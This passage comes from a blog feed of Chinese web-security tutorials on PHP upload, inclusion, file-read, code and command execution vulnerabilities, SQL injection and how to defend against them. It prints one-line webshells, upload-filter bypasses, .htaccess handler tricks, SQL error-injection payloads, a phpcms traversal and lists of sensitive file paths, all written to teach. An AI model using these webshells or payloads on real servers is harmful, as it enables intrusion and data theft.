class="hljs-number">0</span>);<span class="hljs-comment">// Report simple running errors</span>error_reporting(E_ERROR | E_WARNING | E_PARSE);<span class="hljs-comment">// 报告 E_NOTICE也挺好 (报告未初始化的变量</span><span class="hljs-comment">// 或者捕获变量名的错误拼写)</span>error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);<span class="hljs-comment">// 除了 E_NOTICE，报告其他所有错误</span>error_reporting(E_ALL ^ E_NOTICE);<span class="hljs-comment">// 报告所有 PHP 错误 (参见 changelog)</span>error_reporting(E_ALL);<span class="hljs-comment">// 报告所有 PHP 错误</span>error_reporting(<span class="hljs-number">-1</span>);<span class="hljs-comment">// 和 error_reporting(E_ALL); 一样</span>ini_set(<span class="hljs-string">'error_reporting'</span>, E_ALL);<span class="hljs-meta">?&gt;</span></code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP文件上传漏洞</title>
    <link href="/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>文件上传漏洞的一些整理</p><a id="more"></a><h1 id="PHP文件上传漏洞"><a href="#PHP文件上传漏洞" class="headerlink" title="PHP文件上传漏洞"></a>PHP文件上传漏洞</h1><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><ol><li><p>简介<br>在头像上传、附件上传等处都可能由于服务器配置不当（如开启了PUT方法）和过滤不足而产生文件上传漏洞，使用户可以上传文件</p></li><li><p>利用条件</p><ul><li>web服务器开启文件上传功能且对外开放接口</li><li>web用户对目录具有可写甚至可执行权限</li><li>web服务器可以解析上传的脚本</li><li>服务器配置不当（如开启了PUT方法）</li></ul></li><li><p>相关函数<br>对于使用框架编写的web应用，通常使用上传类来进行文件上传</p><p>常规的文件上传函数只有一个 move_uploaded_file(file,newloc)<br>第一个参数是要上传的文件，第二个是上传后存放的位置<br>如果成功该函数返回 TRUE，如果失败则返回 FALSE</p></li><li><p>危害<br>如果服务器具有目录的执行权限，就可以上传后门文件，攻击者还可以通过其他提权方法拿到系统管理权限，进一步攻击同一服务器下的其他网站</p></li></ol><h2 id="02-webshell"><a href="#02-webshell" class="headerlink" title="02 webshell"></a>02 webshell</h2><ol><li><p>简介<br>在计算机科学中，shell指“为操作者提供操作界面”的软件（命令解释器）<br>webshell是一个网站的后门，也是命令解释器，可以以HTTP协议通信，继承了web用户权限，可以接收命令在服务器端执行<br>webshell本质是一个可以在服务器端运行的脚本文件</p></li><li><p>大马和小马<br>根据代码量的大小，webshell可以分为大马和小马，几个简单小马如下</p><pre><code class="hljs php"><span class="hljs-comment">//PHP</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_REQUEST[<span class="hljs-string">'cmd'</span>]); <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//ASP</span>&lt;%<span class="hljs-keyword">eval</span> request(<span class="hljs-string">"cmd"</span>)%&gt;  <span class="hljs-comment">//ASP.NET</span>&lt;%@ Page Language=<span class="hljs-string">"Jscript"</span>%&gt;&lt;%<span class="hljs-keyword">eval</span>(Request.Item[<span class="hljs-string">"cmd"</span>],<span class="hljs-string">"unsafe"</span>);%&gt;</code></pre><p>一句话木马通常配合菜刀、蚁剑等使用，连接密码即为参数名，上边几个小马的密码都是cmd</p><p>使用小马和菜刀可以实现三大基本功能：</p><ul><li>文件管理<br>可以继承web用户权限实现查看、上传、下载、修改、删除、运行等</li><li>虚拟终端<br>可以开启虚拟终端窗口执行命令</li><li>数据库使用<br>可以进行数据库管理，但需要知道数据库的账号密码</li></ul><p>大马代码量较大，可以进行文件管理、执行命令等，可以定制</p></li></ol><h2 id="03-防御与绕过"><a href="#03-防御与绕过" class="headerlink" title="03 防御与绕过"></a>03 防御与绕过</h2><ol><li><p>防御方法：黑白名单<br>使用黑白名单限制可以上传的文件类型或者可以执行上传的用户<br>白名单优先级高于黑名单</p><p>绕过方法：检查黑白名单设置是否全面</p></li><li><p>防御方法：后缀名检查<br>检查后缀名是否是允许的类型</p><p>绕过方法：抓包修改后缀名、00截断如：1.php(0x00).jpg 或 1.php%00.jpg</p></li><li><p>防御方法：MIME类型检测<br>MIME时描述消息内容的因特网标准，常见的类型有：</p><table><thead><tr><th>文件扩展名</th><th>MIME类型</th></tr></thead><tbody><tr><td>.js</td><td>application/x-javascript</td></tr><tr><td>.html</td><td>text/html</td></tr><tr><td>.jpg</td><td>image/jpeg</td></tr><tr><td>.png</td><td>image/png</td></tr><tr><td>.pdf</td><td>application/pdf</td></tr></tbody></table><p>可以在HTTP数据包的Content-Type中查看</p><p>绕过方法：抓包修改Content-Type</p></li><li><p>防御方法：文件内容检查<br>如检查文件是否为图片，可以使用PHP中的getimagesize()函数，此函数本意是检查图片大小，但是在检查之前会首先判断文件是否是一个图片</p><p>绕过方法：在文件内容开头添加文件幻数，如添加GIF89a之后即可被认为是GIF文件</p><ul><li>jpg 格式图片头部是JFIF </li><li>gif头部是GIF89a</li><li>png头部是%PNG</li></ul></li><li><p>防御方法：隐藏或加密上传文件名与路径<br>使上传文件名与路径不可预测，使攻击者无法找到上传的文件</p></li><li><p>攻击方法：修改./htaccess<br>./htaccess是Apache服务器的配置文件，会覆盖全局配置，作用于是当前目录及子目录，我们可以上传一个新的./htaccess来修改服务器配置</p><ul><li>解析方式<br>AddType application/x-httpd-php .png<br>写入./htaccess后，就可以执行png文件中的php代码</li><li>包含关键字<br>AddHandler php5-script php<br>写入./htaccess后，如果文件名中包含关键字.php,就可以执行代码，例如可以执行info.php.png中的PHP代码</li><li>匹配文件名<br>&lt;FilesMatch “testname”&gt;<br>SetHandler application/s-httpd-php<br>&lt;/FilesMatch&gt;<br>写入./htaccess后，就可以匹配文件名为testname的文件，并执行其中的PHP代码</li></ul></li></ol><h2 id="04-web容器解析漏洞"><a href="#04-web容器解析漏洞" class="headerlink" title="04 web容器解析漏洞"></a>04 web容器解析漏洞</h2><ol><li><p>apache 解析漏洞<br>apache会从后向前找可以识别的后缀名，因此可以命名为info.php.xx.x.x</p></li><li><p>IIS 5.x/6.0 解析漏洞</p><ul><li>方式一<br>将info.asp命名为info.asp;1.jpg，分号后的内容不被解析，即被认为是info.asp</li><li>方式二<br>创建一个1.asp的文件夹，文件夹中的文件都被当做asp文件执行，可以在其中创建info.jpg的图片木马</li></ul></li><li><p>PHP CGI 解析漏洞（IIS 7.0/7.5）<br>访问info.png时在后边加上/.php,就可以当作php运行</p><p>nginx&lt;8.03中也存在类似问题<br>如果cgi.fix_pathinfor值为1 ，就可能存在漏洞</p></li><li><p>nginx&lt;8.03 空字节漏洞<br>info.html%00.php<br>寻找文件时从前向后读，读取info.html，解析时从后向前，使用php解析</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
      <tag>文件操作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP文件操作漏洞</title>
    <link href="/PHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/"/>
    <url>/PHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>文件下载（文件读取）、文件删除</p><a id="more"></a><h1 id="PHP文件操作漏洞"><a href="#PHP文件操作漏洞" class="headerlink" title="PHP文件操作漏洞"></a>PHP文件操作漏洞</h1><h2 id="01-文件下载（文件读取）"><a href="#01-文件下载（文件读取）" class="headerlink" title="01 文件下载（文件读取）"></a>01 文件下载（文件读取）</h2><ol><li><p>原理<br>文件下载与文件读取类似，原因在于程序在下载或者读取文件时，参数filename是用户可控的，使得攻击者可以读取敏感文件</p></li><li><p>相关函数</p><ul><li>file_get_contents()</li><li>highlight_file()</li><li>fopen()</li><li>readfile()</li><li>fread()</li><li>fgetss()</li><li>fgets()</li><li>parse_ini_file()</li><li>show_source()</li><li>file()</li></ul><p>除此之外，文件包含的函数include等也可以通过PHP输入输出流来读取文件 php://filter/</p></li><li><p>phpcms v9的文件读取漏洞</p><pre><code class="hljs php"><span class="hljs-comment">// 路径 /phpcms/modules/search/index.php</span><span class="hljs-meta">&lt;?php</span>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_get_suggest_keyword</span><span class="hljs-params">()</span></span>&#123;  $url=$_GET[<span class="hljs-string">'url'</span>].<span class="hljs-string">'&amp;q='</span>.$_GET[<span class="hljs-string">'q'</span>];  $res=@file_get_contents($url);  <span class="hljs-keyword">if</span>(CHARSET != <span class="hljs-string">'gbk'</span>)&#123;    $res=iconv(<span class="hljs-string">'gbk'</span>,CHARSET,$res);  &#125;  <span class="hljs-keyword">echo</span> $res&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>可以看到代码中读取的文件的路径URL是使用用户传入的参数拼接而成的</p><p>如果我们提交url为空，q为1.php，拼接的路径为url=&amp;q=1.php</p><p>要想读取到1.php，需要将&amp;q去掉，可以将其看做目录，使用../进行跳出</p><p>即传入q=../../1.php,此时url=&amp;q=../../1.php</p><p>此时就将&amp;q=当成了目录进行跳过，可以进行文件读取</p></li></ol><h2 id="02-文件删除"><a href="#02-文件删除" class="headerlink" title="02 文件删除"></a>02 文件删除</h2><ol><li>简介<br>与文件读取类似，使用户可以删除敏感文件</li><li>相关函数<ul><li>unlink()</li><li>老版本 session_destroy()</li></ul></li><li>利用方法<br>删除当前目录下的文件或者使用../跳转来删除其他目录下的文件</li></ol><h2 id="03-文件操作漏洞的防范"><a href="#03-文件操作漏洞的防范" class="headerlink" title="03 文件操作漏洞的防范"></a>03 文件操作漏洞的防范</h2><ol><li>文件操作漏洞的共同点<ul><li>由越权操作使用户可以操作未授权操作的文件</li><li>通过跳转目录的方法来操作更多文件</li><li>在请求中传入文件名或路径</li></ul></li><li>防御手段<ul><li>对权限的管理要合理</li><li>检查参数中是否有../等跳转符号</li><li>不直接传入文件名，可以使用MD5加密等方式</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
      <tag>文件操作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入常用函数</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>一些常用函数与语句</p><a id="more"></a><h2 id="01-编码函数"><a href="#01-编码函数" class="headerlink" title="01 编码函数"></a>01 编码函数</h2><ol><li>hex()<br>将十进制数字或字符串转为十六进制</li><li>0x开头的十六进制可以被转换成字符串</li><li>ascii()<br>将字符串的第一个字符转换为ASCII码</li><li>ord()<br>将字符串的第一个字符转换为ASCII码<br>如果or被过滤，也会影响ord()</li><li>CHAR()<br>将ASCII码转换为字符</li></ol><h2 id="02-系统函数"><a href="#02-系统函数" class="headerlink" title="02 系统函数"></a>02 系统函数</h2><ol><li>@@datadir<br>返回数据存储目录</li><li>@@basedir<br>返回MySQL安装目录</li><li>@@version_compile_os<br>返回服务器的操作系统</li><li>database()<br>查看当前数据库名</li><li>user()<br>查看当前用户名</li><li>version()<br>查看数据库版本</li></ol><h2 id="03-字符截取函数"><a href="#03-字符截取函数" class="headerlink" title="03 字符截取函数"></a>03 字符截取函数</h2><ol><li><p>mid(s,m[,n])<br>s：必需，要截取的字段<br>m：必需，起始位置，从1开始计数，也可从最后一位开始从-1开始计数<br>n：可选，要截取的长度，若省略则返回剩余全部文本</p><p>逗号被过滤时可以使用mid(s from m for n )</p></li><li><p>substr(s,m[,n]) / substring(s,m[,n])<br>s：必需，要截取的字段<br>m：必需，起始位置，从1开始计数，也可从最后一位开始从-1开始计数<br>n：可选，要截取的长度，若省略则返回剩余全部文本<br>也可以写为substr(s FROM m FOR n)</p></li><li><p>left(s,n)<br>截取字符串s左边n位<br>类似的还有right()</p></li><li><p>length()<br>获取字符串长度</p></li><li><p>ELT(N,str1,str2,str3,…)<br>如果N =1返回str1，如果N= 2返回str2，等等<br>如果N&lt;1或者N大于参数的数量，就返回NULL</p></li><li><p>limit m,n<br>从第m行开始，截取n行（从0开始计数）<br>逗号被过滤时可以使用 limit m offset n</p></li></ol><h2 id="04-字符串拼接函数"><a href="#04-字符串拼接函数" class="headerlink" title="04 字符串拼接函数"></a>04 字符串拼接函数</h2><ol><li>concat(str1,str2…)<br>拼接字符串，无分隔符</li><li>concat_ws(separator,str1,str2,…)<br>拼接字符串，第一个参数为分隔符</li><li>group_concat(str1,str2..)<br>拼接字符串，每组（每行）结果之间用逗号分开</li><li>group_concat(concat_ws(seperator,str1,str2))<br>拼接字符串，每组（每行）结果之间用分隔符分开</li></ol><h2 id="05-报错注入函数"><a href="#05-报错注入函数" class="headerlink" title="05 报错注入函数"></a>05 报错注入函数</h2><ol><li><p>floor(n)<br>返回不大于n的最大整数</p></li><li><p>rand()<br>随即返回一个0-1之间的浮点数</p></li><li><p>group by<br>分组，当使用rand()函数进行分组聚合时，存在重复键冲突</p><pre><code class="hljs mysql">select concat(left(rand(),1),&#39;^&#39;, (select version()), &#39;^&#39;) as x,count(*) from information_schema.tables group by x</code></pre></li><li><p>updatexml()<br>由于参数不符合xpath规范，就会报错</p><pre><code class="hljs mysql">select (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code></pre></li><li><p>extracvalue()</p><pre><code class="hljs mysql">select (extracvalue(1,concat(0x7e,(select user()),0x7e),1))</code></pre><p>0x7e即<del>，两个</del>之间的值即为查询结果</p></li></ol><h2 id="06-盲注函数"><a href="#06-盲注函数" class="headerlink" title="06 盲注函数"></a>06 盲注函数</h2><ol><li>if(e,t,f)<br>如果表达式e为真，就执行t，否则执行f</li><li>sleep(n)<br>延时n秒</li><li>benchmark(n,e)<br>将表达式e执行n次</li><li>get_lock(key,time)<br>给key加锁，如果失败就延时time s，可以进行两次加锁，第二次就可能出现延时</li><li>笛卡尔积<br>将多个表合成一张表耗时较长，达到延时的效果</li></ol><h2 id="07-information-schema"><a href="#07-information-schema" class="headerlink" title="07 information_schema"></a>07 information_schema</h2><p>在5.0以上版本中，默认定义了infomation数据库，用来存储数据库元信息。其中有表schemata（数据库名）、tables（表名）、columns（列名）</p><p>在schemata表中，schema_name字段用来存储数据库名</p><p>在tables表中，table_schema和table_name分别用来存储数据库名和表名</p><p>在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><h2 id="08-innodb-table-stats"><a href="#08-innodb-table-stats" class="headerlink" title="08 innodb_table_stats"></a>08 innodb_table_stats</h2><p>在MySQL5.6之后，默认引擎是innodb，有一个表是innodb_table_stats，保存了表的修改记录，有database_name,table_name,last_update等字段<br>但是无法查到字段信息，而且需要root权限</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP文件包含漏洞</title>
    <link href="/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>文件包含漏洞的原理及利用</p><a id="more"></a><h1 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h1><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><p>开发PHP程序时，通常将可复用的函数写入文件中，在使用这个函数时直接调用文件，不用重新编写函数，可以使程序更加灵活。如果动态包含的参数没有严格过滤，就会产生文件包含漏洞。</p><ol><li><p>文件包含漏洞的原因可以总结为以下两点：</p><ul><li>程序使用了动态包含</li><li>包含的文件路径参数客户端可控</li></ul></li><li><p>PHP中的相关配置</p><ul><li>allow_url_fopen=On/Off         本地文件包含（LFI）</li><li>allow_url_include=On/Off       远程文件包含（RFI）</li></ul></li><li><p>PHP中常用文件包含的函数有四个：</p><ul><li>include()                    文件包含失败时会继续执行</li><li>include_once()         文件包含失败时会继续执行，只会包含一次</li><li>require()                    文件包含失败时会直接结束</li><li>require_once()          文件包含失败时会直接结束，只会包含一次</li></ul></li><li><p>特点</p><ul><li>无视扩展名读取文件<br>包含文件时会读取文件的源码，打开图片时不是图像，而是图片源码</li><li>无条件解析PHP代码<br>遇到符合PHP语法规范的代码时，无论后缀名，都会执行PHP代码</li></ul></li></ol><h2 id="02-利用"><a href="#02-利用" class="headerlink" title="02 利用"></a>02 利用</h2><ol><li><p>危害</p><ul><li>读取敏感文件<br>需要文件存在，且具有可读权限</li><li>包含木马</li></ul></li><li><p>截断方式</p><ol><li><p>00截断<br>需要关闭PHP的魔术引号，PHP版本小于5.3.4</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'path'</span>]))&#123;    <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">'path'</span>].<span class="hljs-string">".html"</span>;  &#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"?path=[path]"</span>;  &#125;</code></pre></li></ol><p>​    在以上的代码中，规定了包含文件的后缀名是html，可以使用00截断来包含其他类型的文件，提交变量?path=info.php%00即可</p><ol start="2"><li><p>./截断<br>不受GPC限制，PHP版本需要小于5.3</p><ul><li><p>在文件名之后加上./可以进行截断，如info.php……….</p><p>在Windows下240个.或者240个./可以截断，在Linux下，2038个/.可以截断</p></li><li><p>在文件可以使用../来移动目录，从而读取其他目录下的文件</p></li></ul></li><li><p>？伪截断<br>不受GPC和PHP版本的限制<br>新建一个1.txt，输入 this is 1.txt</p><p>在上述代码中提交 ?path=<a href="http://127.0.0.1/1.txt" target="_blank" rel="noopener">http://127.0.0.1/1.txt</a>?</p><p>拼接结果为?path=<a href="http://127.0.0.1/1.txt?.html" target="_blank" rel="noopener">http://127.0.0.1/1.txt?.html</a><br>?.html被当做请求参数，实际请求对象是1.txt<br>执行后成功输出1.txt中的内容</p></li></ol></li><li><p>Windows下的敏感目录</p><ul><li>C:\boot.ini            //查看系统版本</li><li>C:\windows\system32\inetsrv\MetaBase.xml    //iis配置文件</li><li>C:\windows\repair\same    //存储windows初次安装密码</li><li>C:\ProgramFiles\mysql\my.ini    //mysql配置信息</li><li>C:\ProgramFiles\mysql\data\mysql\user.MYD    //mysql root密码</li><li>C:\windows\php.ini    //php配置信息</li></ul></li><li><p>Linux\Unix下的敏感目录</p><ul><li>/etc/passwd    //账户信息</li><li>/etc/shadow    //账户密码文件</li><li>/usr/local/app/apache2/conf/httpd.conf    //Apache2默认配置文件</li><li>/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置</li><li>/usr/local/app/php5/lib/php.ini    //php配置</li><li>/etc/httpd/conf/httpd.conf    //Apache配置</li><li>/etc/my.conf    //mysql配置</li></ul></li><li><p>相关协议</p><ul><li>file://      访问本地系统文件</li><li>http://    访问HTTP(S)网址</li><li>ftp://       访问FTP(S)网址</li><li>php://     访问输入输出流</li><li>zlib://      压缩流</li><li>data://    数据</li><li>glob://     查找匹配的文件路径模式</li><li>phar://     PHP归档</li><li>ssh2://      Secure Shell 2</li><li>rar://         RAR压缩文件</li><li>ogg://        音频流</li><li>expect://   交互式的流</li></ul><p><img src="1.png" srcset="/img/loading.gif" alt=""></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
      <tag>文件操作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码执行漏洞简介</title>
    <link href="/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/"/>
    <url>/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>简单总结PHP中的代码执行漏洞</p><a id="more"></a><h1 id="PHP代码执行漏洞"><a href="#PHP代码执行漏洞" class="headerlink" title="PHP代码执行漏洞"></a>PHP代码执行漏洞</h1><h2 id="01-代码执行简介"><a href="#01-代码执行简介" class="headerlink" title="01 代码执行简介"></a>01 代码执行简介</h2><ol><li><p>代码执行指的是执行PHP代码，而命令执行指的是执行系统命令或应用指令</p></li><li><p>代码执行是由于应用程序过滤不严，用户可以通过请求将代码注入到应用程序中执行，造成漏洞的原因有两点：</p><ul><li>程序中含有可执行PHP代码的函数</li><li>传入函数的参数客户端可控，可以直接修改或者影响</li></ul></li><li><p>漏洞危害：</p><ul><li><p>继承web服务器权限，执行任意代码</p></li><li><p>如果web服务器权限较高，可以读写文件，控制网络和服务器</p></li></ul></li></ol><h2 id="02-代码执行的相关函数"><a href="#02-代码执行的相关函数" class="headerlink" title="02 代码执行的相关函数"></a>02 代码执行的相关函数</h2><ol><li><p>eval和assert<br>将参数作为PHP代码执行<br>参数必须是完整的php语句，包括分号</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span></code></pre><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p></li><li><p>preg_replace<br>preg_replace($pattern, $replacement, $subject)<br>正则替换的方法是搜索$subject，将符合$pattern的部分用$replacement进行替换，如果$pattern中含有参数/e，就将$replacement作为PHP代码执行<br>测试代码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'code'</span>]))&#123;        $code=$_GET[<span class="hljs-string">'code'</span>];        preg_replace(<span class="hljs-string">"/\[(.*)\]/e"</span>,<span class="hljs-string">'\\1'</span>,$code);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"?code=[phpinfo()]"</span>;    &#125;<span class="hljs-meta">?&gt;</span></code></pre><p>测试失败，传入?code=[phpinfo()]之后，页面仍未执行代码</p></li><li><p>回调函数<br>call_user_func()具有两个参数，第一个参数是要执行的函数，第二个参数是要执行的函数的参数</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myeval</span><span class="hljs-params">($cmd)</span></span>&#123;        <span class="hljs-keyword">eval</span>($cmd);    &#125;    $c=$_GET[<span class="hljs-string">'cmd'</span>];    call_user_func(<span class="hljs-string">'myeval'</span>,$c);<span class="hljs-meta">?&gt;</span></code></pre><p>可以传入?cmd=phpinfo(); 成功执行</p></li><li><p>动态函数<br>PHP中，函数可以直接由字符串拼接</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    $_GET[<span class="hljs-string">'a'</span>]($_GET[<span class="hljs-string">'b'</span>]);<span class="hljs-meta">?&gt;</span></code></pre><p>?a=assert&amp;b=phpinfo()</p></li></ol><h2 id="03-漏洞防范"><a href="#03-漏洞防范" class="headerlink" title="03 漏洞防范"></a>03 漏洞防范</h2><ol><li>尽量不使用eval、assert等函数，在disable_funtions中禁止</li><li>对输入进行严格的限制</li><li>preg_replace不使用/e修饰符</li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码执行</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入 漏洞防范</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5-%E6%BC%8F%E6%B4%9E%E9%98%B2%E8%8C%83/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5-%E6%BC%8F%E6%B4%9E%E9%98%B2%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<p>PHP中几种防范SQL注入的函数</p><a id="more"></a><h1 id="SQL注入漏洞防范"><a href="#SQL注入漏洞防范" class="headerlink" title="SQL注入漏洞防范"></a>SQL注入漏洞防范</h1><h2 id="01-GPC-runtime-魔术引号"><a href="#01-GPC-runtime-魔术引号" class="headerlink" title="01 GPC/runtime 魔术引号"></a>01 GPC/runtime 魔术引号</h2><p>magic_quotes_gpc()对GET、POST、COOKIE的值进行过滤</p><p>magic_quotes_runtime()对从数据库或者文件中获取的数据进行过滤</p><p>这两个函数只能对单引号、双引号、反斜杠、空字符进行过滤，对int型的注入作用不大</p><p>PHP4.2.3之前可以在任何地方设置开启，之后的版本可以在php.ini、httpd.conf、.htaccess中开启</p><h2 id="02-过滤类"><a href="#02-过滤类" class="headerlink" title="02 过滤类"></a>02 过滤类</h2><ol><li><p>addslashes<br>对单引号、双引号、反斜杠、空字符进行转义，参数必须是string类型</p></li><li><p>mysql_escape_string<br>转义字符有\x00, \n, \r, , ‘, “, \x1a</p></li><li><p>mysql_real_escape_string（更推荐）</p><p>过滤字符同上，不同之处在于接受的是一个连接句柄，并根据当前字符集转义字符串</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  $con = mysql_connect(<span class="hljs-string">"localhost"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">"123456"</span>);$id = mysql_real_escape_string($_GET[<span class="hljs-string">'id'</span>],$con);$sql = <span class="hljs-string">"select * from table where id='"</span>.$id.<span class="hljs-string">"'"</span>;<span class="hljs-keyword">echo</span> $sql;<span class="hljs-meta">?&gt;</span></code></pre></li><li><p>intval<br>将变量转换成int类型，适用于int型注入</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  $id = intval(<span class="hljs-string">"1 union select"</span>);<span class="hljs-keyword">echo</span> $id;<span class="hljs-meta">?&gt;</span></code></pre><p>输出结果为 1 </p><p>类似的还有floatval等函数</p></li></ol><h2 id="03-PDO-prepare预编译"><a href="#03-PDO-prepare预编译" class="headerlink" title="03 PDO prepare预编译"></a>03 PDO prepare预编译</h2><p>将sql参数使用？代替，作为占位符</p><p>输入的值只作为参数，而不去拼接SQL语句</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  dbh = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">"mysql:host=localhost; dbname=demo"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"pass"</span>);$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,<span class="hljs-keyword">false</span>);$dbh-&gt;exec(<span class="hljs-string">"set names 'gbk'"</span>);$sql = <span class="hljs-string">"select * from test where name = ? and password = ? "</span>;$stmt = $dbh-&gt;prepare($sql);$exeres = $stmt-&gt;execute(<span class="hljs-keyword">array</span>($name,$pass));<span class="hljs-meta">?&gt;</span></code></pre><p>预编译除了可以避免SQL注入，还可以提高SQL语句的复用</p><p>但是预编译并不能完全防止SQL注入<br>因为SQL语句中的表名和列名、ORDER BY后的ASC/DESC无法使用占位符替代，如果涉及到表为变量，用户可以控制排序方式，就可能出现SQL注入</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP命令执行漏洞简介</title>
    <link href="/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/"/>
    <url>/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>简单总结并验证命令执行漏洞</p><a id="more"></a><h1 id="PHP命令执行漏洞"><a href="#PHP命令执行漏洞" class="headerlink" title="PHP命令执行漏洞"></a>PHP命令执行漏洞</h1><h2 id="01-命令执行简介"><a href="#01-命令执行简介" class="headerlink" title="01 命令执行简介"></a>01 命令执行简介</h2><ol><li>命令执行的原理及成因<br>程序员使用脚本语言（如PHP）进行开发时，需要调用一些外部程序（系统命令或可执行文件），在调用这些命令时，如果将用户的输入作为系统命令的参数拼接到命令行中，并且没有对用户的输入进行过滤，就会造成命令执行漏洞。<br>可以总结为两点：<ul><li>用户输入拼接到系统命令中执行</li><li>用户输入未经过过滤(命令不再执行)或净化(去除敏感字,命令继续执行)</li></ul></li><li>漏洞危害<ul><li>继承web服务器权限，执行系统命令</li><li>继承web服务器权限，读写文件</li><li>反弹shell</li><li>控制网站和服务器</li></ul></li></ol><h2 id="02-命令执行的相关函数"><a href="#02-命令执行的相关函数" class="headerlink" title="02 命令执行的相关函数"></a>02 命令执行的相关函数</h2><p>测试前，首先要检查以下函数是否在php.ini中被’disable_functions=’禁止</p><ol><li>system()<br>将字符串作为系统命令执行，并且输出结果</li></ol><p>执行命令成功则返回true，否则返回false<br>   